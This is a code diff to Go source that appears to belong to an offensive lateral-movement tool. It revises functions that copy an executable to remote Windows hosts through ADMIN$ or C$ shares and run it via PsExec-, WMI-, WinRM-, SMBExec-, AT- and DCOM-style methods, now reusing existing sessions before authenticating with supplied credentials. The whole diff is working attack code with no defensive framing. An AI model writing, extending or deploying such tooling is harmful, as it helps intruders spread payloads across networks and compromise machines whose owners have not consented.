@@ -70,19 +70,36 @@ func lateralAuth(host, user, pass string) {
 	lpUser, _ := syscall.UTF16PtrFromString(user)
 	lpPass, _ := syscall.UTF16PtrFromString(pass)
 	nr := netResource{dwType: resourceTypeAny, lpRemoteName: uintptr(unsafe.Pointer(lpRemote))}
-	lpCancel, _ := syscall.UTF16PtrFromString(ipcPath)
-	procWNetCancelConn2.Call(uintptr(unsafe.Pointer(lpCancel)), 0, 1)
-	procWNetAddConn2W.Call(
+	// Try to add the IPC$ connection with provided creds.
+	// If already connected as a different user (error 1219), cancel the
+	// existing IPC$ connection only (fForce=0, won't tear down ADMIN$)
+	// then retry. Never force-close with fForce=1 which can kill ADMIN$
+	// tree connects sharing the same TCP session.
+	ret, _, _ := procWNetAddConn2W.Call(
 		uintptr(unsafe.Pointer(&nr)),
 		uintptr(unsafe.Pointer(lpPass)),
 		uintptr(unsafe.Pointer(lpUser)),
 		0,
 	)
+	const ERROR_SESSION_CREDENTIAL_CONFLICT = 1219
+	if ret == ERROR_SESSION_CREDENTIAL_CONFLICT {
+		// Cancel IPC$ without force to free the credential slot, then retry
+		lpCancel, _ := syscall.UTF16PtrFromString(ipcPath)
+		procWNetCancelConn2.Call(uintptr(unsafe.Pointer(lpCancel)), 0, 0)
+		procWNetAddConn2W.Call(
+			uintptr(unsafe.Pointer(&nr)),
+			uintptr(unsafe.Pointer(lpPass)),
+			uintptr(unsafe.Pointer(lpUser)),
+			0,
+		)
+	}
 }
 
 // smbStage writes data to \\host\ADMIN$\<name> (C:\Windows\<name>) or
 // falls back to \\host\C$\Windows\Temp\<name>. Returns the local path
 // the remote process will see when it executes.
+// It tries with the existing Windows session first (preserving live connections),
+// and only falls back to the C$ path if ADMIN$ is unavailable.
 func smbStage(host, name string, data []byte) (string, error) {
 	unc1 := `\\` + host + `\ADMIN$\` + name
 	if err := os.WriteFile(unc1, data, 0644); err == nil {
@@ -107,9 +124,12 @@ func lateralPSExec(host string, data []byte, svcName, user, pass string) (string
 	}
 	exeName := svcName + ".exe"
 
-	lateralAuth(host, user, pass)
-
+	// Try to stage using any existing Windows session first; only auth if needed.
 	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		lateralAuth(host, user, pass)
+		localPath, err = smbStage(host, exeName, data)
+	}
 	if err != nil {
 		return "", fmt.Errorf("psexec: %w", err)
 	}
@@ -163,9 +183,12 @@ func lateralWMI(host string, data []byte, svcName, user, pass string) (string, e
 	}
 	exeName := svcName + ".exe"
 
-	lateralAuth(host, user, pass)
-
+	// Try to stage using any existing Windows session first; only auth if needed.
 	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		lateralAuth(host, user, pass)
+		localPath, err = smbStage(host, exeName, data)
+	}
 	if err != nil {
 		return "", fmt.Errorf("wmi: %w", err)
 	}
@@ -196,9 +219,12 @@ func lateralWinRM(host string, data []byte, svcName, user, pass string) (string,
 	}
 	exeName := svcName + ".exe"
 
-	lateralAuth(host, user, pass)
-
+	// Try to stage using any existing Windows session first; only auth if needed.
 	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		lateralAuth(host, user, pass)
+		localPath, err = smbStage(host, exeName, data)
+	}
 	if err != nil {
 		return "", fmt.Errorf("winrm: %w", err)
 	}
@@ -312,9 +338,12 @@ func lateralSMBExec(host string, data []byte, svcName, user, pass string) (strin
 	}
 	exeName := svcName + ".exe"
 
-	lateralAuth(host, user, pass)
-
+	// Try to stage using any existing Windows session first; only auth if needed.
 	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		lateralAuth(host, user, pass)
+		localPath, err = smbStage(host, exeName, data)
+	}
 	if err != nil {
 		return "", fmt.Errorf("smbexec: %w", err)
 	}
@@ -376,9 +405,12 @@ func lateralATExec(host string, data []byte, svcName, user, pass string) (string
 	}
 	exeName := svcName + ".exe"
 
-	lateralAuth(host, user, pass)
-
+	// Try to stage using any existing Windows session first; only auth if needed.
 	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		lateralAuth(host, user, pass)
+		localPath, err = smbStage(host, exeName, data)
+	}
 	if err != nil {
 		return "", fmt.Errorf("atexec: %w", err)
 	}
@@ -428,9 +460,12 @@ func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, 
 	}
 	exeName := svcName + ".exe"
 
-	lateralAuth(host, user, pass)
-
+	// Try to stage using any existing Windows session first; only auth if needed.
 	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		lateralAuth(host, user, pass)
+		localPath, err = smbStage(host, exeName, data)
+	}
 	if err != nil {
 		return "", fmt.Errorf("dcom: %w", err)
 	}
